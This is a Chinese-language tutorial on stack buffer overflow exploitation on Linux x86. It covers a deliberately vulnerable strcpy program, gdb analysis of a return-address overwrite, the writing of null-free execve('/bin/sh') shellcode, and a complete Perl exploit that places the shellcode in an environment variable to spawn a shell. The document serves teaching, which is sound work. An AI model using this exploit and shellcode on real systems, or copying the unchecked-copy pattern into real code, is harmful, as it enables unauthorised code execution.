
# Linux x86 下溢出漏洞利用学习

> 原文：[`www.pediy.com/kssd/pediy10/85036.html`](https://www.pediy.com/kssd/pediy10/85036.html)

**背景：**从进入计算机领域已有近八年的时间了，自我感觉在整体轮廓上对各层次都有了一定的了解。但就安全领域来说，却是实实在在的门外汉；然而安全话题却一直引领计算机行业的发展。最近看了不少关于黑客及逆向工程方面的资料，自认有了一定的了解；尤其在学习 Xfocus 出版的《网络渗透技术》时，发现溢出漏洞的发现和利用原来是这么回事。下面就我所理解的和基于书上所展示的实例，说说 Linux 环境下的漏洞是怎样的以及是如何利用的。
**适宜读者：**想了解溢出漏洞的小白；熟悉 Linux 环境下的 C 编程，熟悉 `Gcc` 与 `Gdb`;熟悉 Linux 下的 AT&T 汇编；了解 Perl

## 1. 编程环境

我的测试环境是 `Red Hat 9.0`。当然你也可以使用其他的 Linux 版本，不过在高版本的 Linux 环境下可能会有防溢出机制（比如说 `Ubuntu 7.10`）；尽管说在这种环境下也许有高人可以做到溢出利用，但这已不属于本文章的范畴。如果你是小白，如果你想一次成功，推荐你先在 `RH9` 中测试。
在利用漏洞时使用的是 perl 脚本；这里并不需要你有太深的 perl 功底，只要能理解这里使用的几条语句就行了。当然，在你的 `Red Hat` 上一定要安装 `gcc`、`gdb` 和 perl 解释器，这些在安装光盘里都可以找到。
欢迎大家访问我的博客：[`billstone.cublog.cn`](http://billstone.cublog.cn)

## 2. 一个溢出漏洞实例

为了在直观上对溢出有个清晰的理解，我们先给出一个非常简单的溢出漏洞实例。首先看一个有溢出漏洞的简单程序 `vulnerable.c`：
代码:
```
#include <stdio.h>
#include <string.h>
int main(int argc, char \*argv\[\])
{
    char buff\[16\];
    strcpy(buff, argv\[1\]);
    printf("\\n%s\\n", buff);
}
```
程序中在使用 `strcpy` 函数时，因为没有检测字符串的长度而导致当 `argv[1]` 串长超过 16 字节时就会出现缓冲区溢出现象。使用 `gcc` 命令将 `vulnerable.c` 编译为可执行程序 `vulnerable`，命令为 `gcc -o vulnerable vulnerable.c`，如下图所示：
![](img/61cb929d34bfc872e8380fb3aaea8dc3.jpg)
为了在本地利用该漏洞，我们需要精心构造 ShellCode，下面是用 perl 写的利用程序 `exploit.pl`：
代码:
```
#!/usr/bin/perl
#
# exploit.pl
$shellcode = 
"\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69".
"\\x89\\xe3\\x52\\x53\\x89\\xe1\\x8d\\x42\\x0b\\xcd\\x80";
# 这里 path 需要设为本机环境下 vulnerable 的路径
$path = "/home/bill/Cracker/vulnerable"; 
$ret = 0xbffffffc - (length($path)+1) - (length($shellcode)+1);
$new\_retword = pack('l',$ret);
printf("\[+\] Using ret Shellcode 0x%x\\n", $ret);
%ENV=(); $ENV{CC}=$shellcode;
exec "$path",$new\_retword x 8;
```
其中，上面提到的两个程序附在附件中（这里需要注意的是 `exploit.pl` 在创建后需要修改属性才能执行）。上面的 ShellCode 是精心构造过的，在后面的构造 shellcode 章节将讲述。
运行 `exploit.pl` 我们将得到一个 shell（`sh-2.05b$`）：
![](img/0ed941f39407e3349764799ef402727c.jpg)
如果你能得到控制台（`sh-2.05b$`），就代表你已经攻击成功了。下面我们将详细讲述溢出漏洞相关的内容。
欢迎大家讨论！

## 3. 溢出是如何发生的

由于函数中局部变量的内存分配是发生在栈（Stack）中的，所以如果在某一个函数中定义了缓冲区变量，则这个缓冲区变量所占用的内存空间是在该函数被调用时所建立的栈里。由于对缓冲区的潜在操作（比如字串的复制）都是从内存低址到高址的，而内存中所保存的函数调用返回地址往往就在该缓冲区的上方（高地址）这是由于栈的特性决定的，这就为覆盖函数的返回地址提供了条件。当我们有机会用大于目标缓冲区大小的内容来向缓冲区进行填充时，就可以改写函数保存在函数栈（Statck）中的返回地址，从而使程序的执行流程随着我们的意图而转移。这是冯诺依曼计算机体系结构的缺陷。
下面将调试一个简单溢出程序 `simple_overflow.c` 来了解 IA32 架构缓冲区溢出的机制：
代码:
```
#include <stdio.h>
#include <string.h>
char large\[\] = "1234512345123451234512345===ABCD";
int main(void)
{
    char small\[16\];
    strcpy(small, large);
}
```
上面程序中，`large` 字符串的长度是精心构造的，下面会提到；接下来将编译为 `simple_overflow`，并用 `gdb` 调试，结果如下：
![](img/c3e32fcf4617fc4ff2c83d0f3553d78b.jpg)
从图中可以看出，执行结束后 `eip` 已经被改为 `0x44434241`，正好是 `ABCD` 的 ASCII 码值的倒置（`A->0x41`，`B->0x42`，`C->0x43`，`D->0x44`），这是由于 IA32（Intel 架构）默认字节序是 `Little_endian` 方式；而 `ABCD` 则正是上述程序中 `large` 数组的最后四个字母。也就是说在主程序调用 `strcpy` 时，因为 `large` 长度远长于 `small` 而导致返回地址被覆盖了。接下来我们反汇编程序，看看 `eip` 为何会变成 `0x44434241`：
![](img/23732203759b4171596242b3a6aa572a.jpg)
可以看到，在 `main` 函数的最开始设置断点（`b *0x08048328`）执行（`r`）后 `esp` 指向的内容就是 `main` 函数的返回地址（`0x42015574`）；上面 `0x42015571` 位置的命令（`call *0x8(%ebp)`）就是调用执行 `main` 函数。我们的目标就是覆盖这个地址，这样在 `main` 函数返回时转入我们的流程。这里，我们记下返回地址存储的地址 `0xbfffde1c`。
我们关注位置`<main+28>`上的指令（`call 0x8048268<strcpy>`）：在 linux 环境下，当调用函数时将把参数从右向左压入栈（push 命令）中。在本例中，先压入 `0x8049420`（位置`<main+19>`），从下图中可以看到该地址为 `large` 字符串；接着压入 `0xffffffe8(%ebp)`（位置`<main+27>`），该地址就是 `small` 字符串的首地址。
![](img/90398abeaeecba667bcc6f9d85d3e688.jpg)
我们用 `ebp` 减去 `small` 数组的首地址是 24，再加上函数指向最开始要做的保存 `ebp` 操作（）所需要的 4 个字节可以得到 28。可以验证一下 `0xbfffde00`（`small` 数组的首地址）加上 28 正好是我们之前记下的 `0xbfffde1c`；这也正是为何我们的 `large` 数组需要 32（28+4）字节的原因。
![](img/c204771c063f2b64317a232d9596d895.jpg)
如上所示，继续执行到 `main` 函数返回，最后的 `ret` 指令让 `eip` 等于 `esp` 指向的内容，而此时由于执行了有溢出漏洞的 `strcpy` 函数，此时 `esp` 指向的内容已经被我们修改过了（`0x44434241`）。这样，`eip` 就变成了可以控制的地址了，也就是说我们达到了可控流程的目的。

## 4. 如何编写及提取 ShellCode

`Shellcode` 是一段机器指令，用于在溢出之后改变系统正常流程，转而执行 ShellCode 从而完成渗透测试者的功能。1996 年，`Aleph One` 在 Underground 发表的论文给这段代码赋予 ShellCode 的名称，而这个称呼沿用至今。
这里我们将编写一个非常简单的 ShellCode，它的功能是得到一个命令行，下面是其 C 代码及执行情况：
![](img/0a599ea7e725b56c3f896428eb3df330.jpg)
程序 `shellcode` 运行后相当于又执行了一个“`/bin/sh`”，接下来用 `gdb` 调试以查看其关键代码：
![](img/ba347a1d11ac827fe0eec0d4c542a340.jpg)
程序中关键在于调用了 `execve` 函数，通过调试可以清楚得看到在调用该函数前将三个参数按从右向左的顺序压入栈中：先在`<main+33>`压入`$0x0`（即 NULL 参数），接着在`<main+38>`压入`$ebp-8` 即指向地址`$0x8048408` 的指针（即 `name`），最后在`<main+39>`压入地址`$0x8048408`（即 `name[0]`，也就是"`/bin/sh`”字符串的地址）。接着我们反汇编 `execev` 函数（需要重新编译 `shellcode`，使用静态编译，以避免链接干扰。命令为：`gcc static o shellcode shellcode.c`）：
![](img/b521dac9676b81037231ebc600c16d72.jpg)
从反汇编代码中可以看到，其中关键使用了一个软中断功能（`<execve+36>`）。我们在在这个指令位置设断，并查看软中断执行前各寄存器的值：
![](img/d54958767df9104585c5cbba6df4506d.jpg)
可以看到，`eax` 保存 `execve` 的系统调用号 11，`ebx` 保存 `name[0]`（即"`/bin/sh`”），`ecx` 保存 `name` 这个指针，`edx` 为 0。这样执行软中断后就能执行`/bin/sh` 得到 Shell 了；接下来，有了以上的分析就可以编写自己的 ShellCode 了，同时验证上面分析结果的正确性。
下面，我们使用在 C 程序中内嵌汇编的方式构造 shellcode，具体代码如下。有一点要注意，Linux x86 默认的字节序是 little-endian，所以压栈的字符串要注意顺序。
![](img/d0051e5035b47218af3cda0c8c45bd6f.jpg)
通过编译执行，我们成功得到了 shell 命令行（`sh-2.05b$`）。在编写内嵌汇编时一定要注意格式问题；当然最重要的是在执行软中断前一定要使各寄存器的值符合我们之前分析的结果。
此时，编写工作依然没有完结，要记住我们最终的目的是得到 ShellCode，也就是一串汇编指令；而对于 `strcpy` 等函数造成的缓冲区溢出，会认为 `0` 是一个字符串的终结，那么 ShellCode 如果包含 `0` 就会被截断，导致溢出失败。用 `objdump` 看看这个 ShellCode 是否包含 `0`，命令为：`objdump d shellcode_asm | more`。注意在此命令下会反汇编所有包含机器指令的 section，请自行找到`<main>`段：
![](img/82b6c743505f9a77b465322079875191.jpg)
从反汇编结果可以看到，有两条指令"`mov $0x0,%edx`"和"`mov $0xb,%eax`"包含 0，需要变通一下。我们使用命令"`xor %edx,%edx`"替换"`mov $0x0,%edx`"，使用"`lea 0xb(%edx),%eax`"替换"`mov $0xb,%eax`"，情况如下：
![](img/de06089da9b0cb1d47be24cd4c750cc1.jpg)
运行没有问题，再看看这个 ShellCode 有没有包含 0：
![](img/3944eef9ed8d6543ac5fbcd7f9f432b8.jpg)
可以看到，所有曾出现 0 的指令全消除了。也许你会说，地址 `0x80482fd` 上不就有四个 0 么；这里我们需要注意，我们需要提取的 ShellCode 从 `0x8048304` 到 `0x804837a`，所以在此范围内没有 0。
到此为止，ShellCode 的编写工作已经完美完成了；剩下的就是抽取及测试工作了，下面给出了一个简单的测试程序：
![](img/0893a3cf290745d863923d6dbbf6bdaf.jpg)
测试成功。看到上面的 ShellCode 是不是很眼熟？没错，正是在第二章节中我们使用过的 ShellCode。到此，ShellCode 的编写及抽取工作已经完成，相信您看到这里一定也能写出属于自己的 ShellCode 了吧：）

## 5. 怎样利用溢出漏洞

前面我们介绍了溢出是如何产生的，并得到了一个简单的 ShellCode。接下来我们将讲述一种在本地攻击存在溢出漏洞程序的方法：把 ShellCode 放在环境变量里，从而在攻击程序中精确定位 ShellCode。下面是示意图：
![](img/c60a56238cf72d16b2f9c7e4eaca69a5.jpg)
在执行存在漏洞程序前，我们将 ShellCode 作为环境变量传递给程序，现在关键是如何定位 ShellCode 的地址。关于这个问题，我们先看一下堆栈最开始的使用情况，请看下图：
![](img/a19468a6ce51a3e6d46916e44eb1cfe0.jpg)
可以看到栈底是固定的，为 `0xc0000000`，向低地址扩展，先是 4 个字节的 `0x00`，然后是程序路径，接着是环境变量。使用 `gdb` 调试 `simple_overflow` 可以清楚得看到这一点：
![](img/c052903fb2f65103f29af761b1298ccb.jpg)
从上图可以看到，假如我们精心构造的 ShellCode 能作为环境变量存储在程序路径前的一个环境变量中，那么我们将可以精确得定位 ShellCode 的地址。下面是在第二章节中展示的漏洞程序 `vulnerable.c`，不过为了调试方便，我们在程序最后加了一条 `getchar()` 语句：
![](img/04008043340f399005bda0ac9b572d6a.jpg)
下面是我们在第二章节中展示的用 Perl 编写的攻击程序 `exploit.pl`：
![](img/9f7c0c4f78a483b9fe0f05551f7c640b.jpg)
上面程序中，`shellcode` 是我们在第四章节中精心构造过的 ShellCode，`path` 是本机上 `vulnerable` 可执行程序所在的绝对路径（请依据您本机的情况加以修改）；`ret` 则精确定位了 ShellCode 所在地址；`new_retword` 保存了 `ret` 地址的长整型值，接着输出该值以便调试；接着设置 `shellcode` 为环境变量，最后使用 `exec` 调用漏洞程序，参数为连续 8 个 `new_retword` 值。
首先，在一个控制台运行攻击程序：
![](img/8b2281e59802722d0bb38fa96896716f.jpg)
通过输出看到 ShellCode 地址为 `0xbfffffc5`，接着我们在另外一个控制台调试：
![](img/36aae2f25ec37c227aadc720d8c87331.jpg)
我们使用 `gdb` 附上（Attach）`vulnerable` 程序，查看 `0xbfffffc5` 地址上的数据；通过对比，我们可以确定就是我们精心构造过的 Shellcode。
本地缓冲区溢出比较简单，看到这里相信各位都能明白了。

## 总结

溢出利用总是有特定的环境，Windows 和 Linux 下有着显著的区别，而且攻击手段也是层出不穷。本文给大家展示了在 Linux 环境下使用环境变量方法攻击漏洞程序的简单实例。通过阅读本文，希望大家能有所收获。

**题外话**
本文是基于 Xfocus 的《网络渗透技术》一书所写，所以如果在看本文时能对照该书的第二、第三章节相信会更有收获，并且在书中不但阐述了如何在 Linux x86 环境下利用缓冲区溢出，还有 Win32 环境、AIX PowerPC 平台及 Solaris SRARC 平台下的缓冲区溢出利用技术。
